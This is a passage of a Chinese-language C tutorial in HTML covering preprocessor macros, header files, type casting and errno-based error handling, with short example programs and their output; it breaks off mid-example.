class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FILE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_SIZE 42</span></span><br></pre></td></tr></table></figure><p>这个指令告诉 CPP 取消已定义的 FILE_SIZE，并定义它为 42。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MESSAGE</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> MESSAGE <span class="meta-string">"You wish!"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个指令告诉 CPP 只有当 MESSAGE 未定义时，才定义 MESSAGE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">   <span class="comment">/* Your debugging statements here */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p> 这个指令告诉 CPP 如果定义了 DEBUG，则执行处理语句。在编译时，如果您向 gcc 编译器传递了 <em>-DDEBUG</em> 开关量，这个指令就非常有用。它定义了 DEBUG，您可以在编译期间随时开启或关闭调试。 </p><h3 id="预定义宏"><a href="#预定义宏" class="headerlink" title="预定义宏"></a>预定义宏</h3><p>ANSI C 定义了许多宏。在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏。</p><table><thead><tr><th align="left">宏</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>DATE</strong></td><td align="left">当前日期，一个以 “MMM DD YYYY” 格式表示的字符常量。</td></tr><tr><td align="left"><strong>TIME</strong></td><td align="left">当前时间，一个以 “HH:MM:SS” 格式表示的字符常量。</td></tr><tr><td align="left"><strong>FILE</strong></td><td align="left">这会包含当前文件名，一个字符串常量。</td></tr><tr><td align="left"><strong>LINE</strong></td><td align="left">这会包含当前行号，一个十进制常量。</td></tr><tr><td align="left"><strong>STDC</strong></td><td align="left">当编译器以 ANSI 标准编译时，则定义为 1。</td></tr></tbody></table><p>让我们来尝试下面的实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"File :%s\n"</span>, __FILE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Date :%s\n"</span>, __DATE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Time :%s\n"</span>, __TIME__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line :%d\n"</span>, __LINE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"ANSI :%d\n"</span>, __STDC__ );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码（在文件 <strong>test.c</strong> 中）被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">File</span> :test.c</span><br><span class="line">Date :Jun <span class="number">2</span> <span class="number">2012</span></span><br><span class="line">Time :<span class="number">03</span>:<span class="number">36</span>:<span class="number">24</span></span><br><span class="line">Line :<span class="number">8</span></span><br><span class="line">ANSI :<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="预处理器运算符"><a href="#预处理器运算符" class="headerlink" title="预处理器运算符"></a>预处理器运算符</h3><p>C 预处理器提供了下列的运算符来帮助您创建宏：</p><h5 id="宏延续运算符（-）"><a href="#宏延续运算符（-）" class="headerlink" title="宏延续运算符（\）"></a>宏延续运算符（\）</h5><p>一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（\）。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  message_for(a, b)  \</span></span><br><span class="line">    <span class="built_in">printf</span>(#a <span class="string">" and "</span> #b <span class="string">": We love you!\n"</span>)</span><br></pre></td></tr></table></figure><h5 id="字符串常量化运算符（-）"><a href="#字符串常量化运算符（-）" class="headerlink" title="字符串常量化运算符（#）"></a>字符串常量化运算符（#）</h5><p>在宏定义中，当需要把一个宏的参数转换为字符串常量时，则使用字符串常量化运算符（#）。在宏中使用的该运算符有一个特定的参数或参数列表。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  message_for(a, b)  \</span></span><br><span class="line">    <span class="built_in">printf</span>(#a <span class="string">" and "</span> #b <span class="string">": We love you!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   message_for(Carole, Debra);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Carole <span class="keyword">and</span> Debra: We love you!</span><br></pre></td></tr></table></figure><h5 id="标记粘贴运算符（-）"><a href="#标记粘贴运算符（-）" class="headerlink" title="标记粘贴运算符（##）"></a>标记粘贴运算符（##）</h5><p>宏定义内的标记粘贴运算符（##）会合并两个参数。它允许在宏定义中两个独立的标记被合并为一个标记。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tokenpaster(n) printf (<span class="meta-string">"token"</span> #n <span class="meta-string">" = %d"</span>, token##n)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> token34 = <span class="number">40</span>;</span><br><span class="line">   </span><br><span class="line">   tokenpaster(<span class="number">34</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token34 = <span class="number">40</span></span><br></pre></td></tr></table></figure><p>这是怎么发生的，因为这个实例会从编译器产生下列的实际输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"token34 = %d"</span>, token34);</span><br></pre></td></tr></table></figure><p>这个实例演示了 token##n 会连接到 token34 中，在这里，我们使用了<strong>字符串常量化运算符（#）</strong>和<strong>标记粘贴运算符（##）</strong>。</p><h5 id="defined-运算符"><a href="#defined-运算符" class="headerlink" title="defined() 运算符"></a>defined() 运算符</h5><p>预处理器 <strong>defined</strong> 运算符是用在常量表达式中的，用来确定一个标识符是否已经使用 #define 定义过。如果指定的标识符已定义，则值为真（非零）。如果指定的标识符未定义，则值为假（零）。下面的实例演示了 defined() 运算符的用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined (MESSAGE)</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> MESSAGE <span class="meta-string">"You wish!"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Here is the message: %s\n"</span>, MESSAGE);  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is the message: You wish!</span><br></pre></td></tr></table></figure><h3 id="参数化的宏"><a href="#参数化的宏" class="headerlink" title="参数化的宏"></a>参数化的宏</h3><p>CPP 一个强大的功能是可以使用参数化的宏来模拟函数。例如，下面的代码是计算一个数的平方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">square</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以使用宏重写上面的代码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> square(x) ((x) * (x))</span></span><br></pre></td></tr></table></figure><p>在使用带有参数的宏之前，必须使用 <strong>#define</strong> 指令定义。参数列表是括在圆括号内，且必须紧跟在宏名称的后边。宏名称和左圆括号之间不允许有空格。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x,y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Max between 20 and 10 is %d\n"</span>, MAX(<span class="number">10</span>, <span class="number">20</span>));  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Max between <span class="number">20</span> <span class="keyword">and</span> <span class="number">10</span> is <span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="C-头文件"><a href="#C-头文件" class="headerlink" title="C    头文件"></a>C    头文件</h2><p>头文件是扩展名为 <strong>.h</strong> 的文件，包含了 C 函数声明和宏定义，被多个源文件中引用共享。有两种类型的头文件：程序员编写的头文件和编译器自带的头文件。</p><p>在程序中要使用头文件，需要使用 C 预处理指令 <strong>#include</strong> 来引用它。前面我们已经看过 <strong>stdio.h</strong>头文件，它是编译器自带的头文件。</p><p>引用头文件相当于复制头文件的内容，但是我们不会直接在源文件中复制头文件的内容，因为这么做很容易出错，特别在程序是由多个源文件组成的时候。</p><p>A simple practice in C 或 C++ 程序中，建议把所有的常量、宏、系统全局变量和函数原型写在头文件中，在需要的时候随时引用这些头文件。</p><h3 id="引用头文件的语法"><a href="#引用头文件的语法" class="headerlink" title="引用头文件的语法"></a>引用头文件的语法</h3><p>使用预处理指令 <strong>#include</strong> 可以引用用户和系统头文件。它的形式有以下两种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;file&gt;</span></span></span><br></pre></td></tr></table></figure><p>这种形式用于引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"file"</span></span></span><br></pre></td></tr></table></figure><p> 这种形式用于引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。 </p><h3 id="引用头文件的操作"><a href="#引用头文件的操作" class="headerlink" title="引用头文件的操作"></a>引用头文件的操作</h3><p><strong>#include</strong> 指令会指示 C 预处理器浏览指定的文件作为输入。预处理器的输出包含了已经生成的输出，被引用文件生成的输出以及 <strong>#include</strong> 指令之后的文本输出。例如，如果您有一个头文件 header.h，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>和一个使用了头文件的主程序 <em>program.c</em>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"header.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">puts</span> (test ());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会看到如下的代码信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">puts</span> (test ());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="只引用一次头文件"><a href="#只引用一次头文件" class="headerlink" title="只引用一次头文件"></a>只引用一次头文件</h3><p>如果一个头文件被引用两次，编译器会处理两次头文件的内容，这将产生错误。为了防止这种情况，标准的做法是把文件的整个内容放在条件编译语句中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEADER_FILE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEADER_FILE</span></span><br><span class="line"></span><br><span class="line">the entire header file file</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p> 这种结构就是通常所说的包装器 <strong>#ifndef</strong>。当再次引用头文件时，条件为假，因为 HEADER_FILE 已定义。此时，预处理器会跳过文件的整个内容，编译器会忽略它。 </p><h3 id="有条件引用"><a href="#有条件引用" class="headerlink" title="有条件引用"></a>有条件引用</h3><p>有时需要从多个不同的头文件中选择一个引用到程序中。例如，需要指定在不同的操作系统上使用的配置参数。您可以通过一系列条件来实现这点，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SYSTEM_1</span></span><br><span class="line">   <span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"system_1.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> SYSTEM_2</span></span><br><span class="line">   <span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"system_2.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> SYSTEM_3</span></span><br><span class="line">   ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是如果头文件比较多的时候，这么做是很不妥当的，预处理器使用宏来定义头文件的名称。这就是所谓的<strong>有条件引用</strong>。它不是用头文件的名称作为 <strong>#include</strong> 的直接参数，您只需要使用宏名称代替即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_H <span class="meta-string">"system_1.h"</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> SYSTEM_H</span></span><br></pre></td></tr></table></figure><p> SYSTEM_H 会扩展，预处理器会查找 system_1.h，就像 <strong>#include</strong> 最初编写的那样。SYSTEM_H 可通过 -D 选项被您的 Makefile 定义。 </p><h2 id="C-强制类型转换"><a href="#C-强制类型转换" class="headerlink" title="C    强制类型转换"></a>C    强制类型转换</h2><p>强制类型转换是把变量从一种类型转换为另一种数据类型。例如，如果您想存储一个 long 类型的值到一个简单的整型中，您需要把 long 类型强制转换为 int 类型。您可以使用<strong>强制类型转换运算符</strong>来把值显式地从一种类型转换为另一种类型，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(type_name) expression</span><br></pre></td></tr></table></figure><p> 请看下面的实例，使用强制类型转换运算符把一个整数变量除以另一个整数变量，得到一个浮点数： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> sum = <span class="number">17</span>, count = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">double</span> mean;</span><br><span class="line"></span><br><span class="line">   mean = (<span class="keyword">double</span>) sum / count;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of mean : %f\n"</span>, mean );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Value of mean : <span class="number">3.400000</span></span><br></pre></td></tr></table></figure><p>这里要注意的是强制类型转换运算符的优先级大于除法，因此 <strong>sum</strong> 的值首先被转换为 <strong>double</strong> 型，然后除以 count，得到一个类型为 double 的值。</p><p>类型转换可以是隐式的，由编译器自动执行，也可以是显式的，通过使用<strong>强制类型转换运算符</strong>来指定。在编程时，有需要类型转换的时候都用上强制类型转换运算符，是一种良好的编程习惯。</p><h3 id="整数提升"><a href="#整数提升" class="headerlink" title="整数提升"></a>整数提升</h3><p> 整数提升是指把小于 <strong>int</strong> 或 <strong>unsigned int</strong> 的整数类型转换为 <strong>int</strong> 或 <strong>unsigned int</strong> 的过程。请看下面的实例，在 int 中添加一个字符： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  i = <span class="number">17</span>;</span><br><span class="line">   <span class="keyword">char</span> c = <span class="string">'c'</span>; <span class="comment">/* ascii 值是 99 */</span></span><br><span class="line">   <span class="keyword">int</span> sum;</span><br><span class="line"></span><br><span class="line">   sum = i + c;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of sum : %d\n"</span>, sum );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Value of sum : <span class="number">116</span></span><br></pre></td></tr></table></figure><p> 在这里，sum 的值为 116，因为编译器进行了整数提升，在执行实际加法运算时，把 ‘c’ 的值转换为对应的 ascii 值。 </p><h3 id="常用的算术转换"><a href="#常用的算术转换" class="headerlink" title="常用的算术转换"></a>常用的算术转换</h3><p><strong>常用的算术转换</strong>是隐式地把值强制转换为相同的类型。编译器首先执行<strong>整数提升</strong>，如果操作数类型不同，则它们会被转换为下列层次中出现的最高层次的类型：</p><p><img alt="Usual Arithmetic Conversion" data-src="https://www.runoob.com/wp-content/uploads/2014/08/usual_arithmetic_conversion.png" class="lazyload"></p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  i = <span class="number">17</span>;</span><br><span class="line">   <span class="keyword">char</span> c = <span class="string">'c'</span>; <span class="comment">/* ascii 值是 99 */</span></span><br><span class="line">   <span class="keyword">float</span> sum;</span><br><span class="line"></span><br><span class="line">   sum = i + c;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of sum : %f\n"</span>, sum );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Value of sum : <span class="number">116.000000</span></span><br></pre></td></tr></table></figure><p> 在这里，c 首先被转换为整数，但是由于最后的值是 float 型的，所以会应用常用的算术转换，编译器会把 i 和 c 转换为浮点型，并把它们相加得到一个浮点数。 </p><h2 id="C-错误处理"><a href="#C-错误处理" class="headerlink" title="C    错误处理"></a>C    错误处理</h2><p>C 语言不提供对错误处理的直接支持，但是作为一种系统编程语言，它以返回值的形式允许您访问底层数据。在发生错误时，大多数的 C 或 UNIX 函数调用返回 1 或 NULL，同时会设置一个错误代码 <strong>errno</strong>，该错误代码是全局变量，表示在函数调用期间发生了错误。您可以在 errno.h 头文件中找到各种各样的错误代码。</p><p>所以，C 程序员可以通过检查返回值，然后根据返回值决定采取哪种适当的动作。开发人员应该在程序初始化时，把 errno 设置为 0，这是一种良好的编程习惯。0 值表示程序中没有错误。</p><h3 id="errno、perror-和-strerror"><a href="#errno、perror-和-strerror" class="headerlink" title="errno、perror() 和 strerror()"></a>errno、perror() 和 strerror()</h3><p>C 语言提供了 <strong>perror()</strong> 和 <strong>strerror()</strong> 函数来显示与 <strong>errno</strong> 相关的文本消息。</p><ul><li><strong>perror()</strong> 函数显示您传给它的字符串，后跟一个冒号、一个空格和当前 errno 值的文本表示形式。</li><li><strong>strerror()</strong> 函数，返回一个指针，指针指向当前 errno 值的文本表示形式。</li></ul><p>让我们来模拟一种错误情况，尝试打开一个不存在的文件。您可以使用多种方式来输出错误消息，在这里我们使用函数来演示用法。另外有一点需要注意，您应该使用 <strong>stderr</strong> 文件流来输出所有的错误。</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> errno ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE * pf;</span><br><span class="line">   <span class="keyword">int</span> errnum;</span><br><span class="line">   pf = fopen (<span class="string">"unexist.txt"</span>, <span class="string">"rb"</span>);</span><br><span class="line">   <span class="keyword">if</span> (pf == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      errnum = errno;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"错误号: %d\n"</span>, errno);</span><br><span class="line">      perror(<span class="string">"通过 perror 输出错误"</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"打开文件错误: %s\n"</span>, strerror( errnum ));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      fclose (pf);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">错误号: <span class="number">2</span></span><br><span class="line">通过 perror 输出错误: No such file <span class="keyword">or</span> directory</span><br><span class="line">打开文件错误: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><h3 id="被零除的错误"><a href="#被零除的错误" class="headerlink" title="被零除的错误"></a>被零除的错误</h3><p>在进行除法运算时，如果不检查除数是否为零，则会导致一个运行时错误。</p><p>为了避免这种情况发生，下面的代码在进行除法运算前会先检查除数是否为零：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 